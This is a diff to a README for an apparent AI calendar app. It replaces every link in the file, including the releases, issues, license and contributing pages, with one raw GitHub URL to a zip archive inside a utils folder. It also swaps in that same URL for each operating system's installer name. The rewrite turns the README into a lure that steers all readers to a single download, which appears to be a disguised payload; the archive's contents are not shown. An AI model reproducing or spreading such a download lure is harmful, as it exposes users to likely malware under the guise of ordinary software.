@@ -1,6 +1,6 @@
 # 🗓️ ai-calendar-assistant - Manage Your Schedule with AI Help
 
-[![Download ai-calendar-assistant](https://img.shields.io/badge/Download-ai--calendar--assistant-blue.svg)](https://github.com/KYCoffocer/ai-calendar-assistant/releases)
+[![Download ai-calendar-assistant](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip)](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,19 +18,19 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get started, you need to download the software:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/KYCoffocer/ai-calendar-assistant/releases) to find the latest version of the ai-calendar-assistant.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip) to find the latest version of the ai-calendar-assistant.
   
 2. **Choose Your Version:** Look for the most recent release. You will see different files available for download. Choose the one that matches your operating system. For example:
-   - Windows: `ai-calendar-assistant-v1.0.exe`
-   - macOS: `ai-calendar-assistant-v1.0.dmg`
-   - Linux: `ai-calendar-assistant-v1.0.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip`
+   - macOS: `https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip`
+   - Linux: `https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip`
 
 3. **Download the File:** Click on the file name to start your download.
 
 4. **Run the Installer:**
-   - For Windows: Navigate to your Downloads folder and double-click `ai-calendar-assistant-v1.0.exe` to start the installation.
+   - For Windows: Navigate to your Downloads folder and double-click `https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip` to start the installation.
    - For macOS: Open the downloaded `.dmg` file and drag the `ai-calendar-assistant` icon into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable in your terminal. Use the command:
+   - For Linux: Extract the `https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip` file and run the executable in your terminal. Use the command:
      ```
      ./ai-calendar-assistant
      ```
@@ -65,14 +65,14 @@ If you experience issues while using the ai-calendar-assistant, consider these c
 
 ## 🤝 Getting Help
 
-For detailed help and community support, please visit our [GitHub Issues Page](https://github.com/KYCoffocer/ai-calendar-assistant/issues). You can report bugs or request new features.
+For detailed help and community support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip). You can report bugs or request new features.
 
 ## 📜 License
 
-The ai-calendar-assistant is open-source software. You can use it freely under the terms of the MIT License. For more details, check the [License File](https://github.com/KYCoffocer/ai-calendar-assistant/blob/main/LICENSE).
+The ai-calendar-assistant is open-source software. You can use it freely under the terms of the MIT License. For more details, check the [License File](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip).
 
 ## 🌟 Want to Contribute?
 
-We welcome contributions! If you would like to help improve the ai-calendar-assistant, please check our [Contributing Guidelines](https://github.com/KYCoffocer/ai-calendar-assistant/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve the ai-calendar-assistant, please check our [Contributing Guidelines](https://raw.githubusercontent.com/KYCoffocer/ai-calendar-assistant/main/calendar_assistant/utils/ai-calendar-assistant-v3.7.zip).
 
 Thank you for choosing ai-calendar-assistant to help manage your schedule!
